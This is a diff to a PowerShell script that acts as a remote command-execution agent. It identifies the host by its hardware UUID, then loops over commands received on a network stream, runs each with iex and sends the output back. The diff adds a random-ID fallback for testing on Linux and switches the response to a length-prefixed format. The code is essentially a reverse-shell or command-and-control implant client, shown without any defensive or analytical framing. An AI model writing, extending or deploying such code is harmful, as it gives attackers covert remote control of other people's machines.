@@ -2,7 +2,7 @@
 try {
     $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
 } catch [System.Management.Automation.CommandNotFoundException] { # For testing on Linux.
-    $uuid = 0;
+    $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-Random));
 }
 
 # Calculate SHA-256 hash from UUID.
@@ -45,11 +45,15 @@ while (1) {
             exit 1;
         }
 
-        # Run command, encode stdout as UTF-8.
-        $out = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));
+        # Run command.
+        $result = (iex $cmd 2>&1 | Out-String)
 
-        # Write output to stream prepended by UUID.
-        $stream.Write($uuid + $out, 0, $uuid.Length + $out.Length;
+        # Construct response.
+        $out = $uuid + [System.Text.Encoding]::UTF8.GetBytes($result);
+        $out = [System.BitConverter]::GetBytes($out.Length) + $out
+
+        # Write response to stream.
+        $stream.Write($out, 0, $out.Length);
         $stream.Flush();
     }
 }
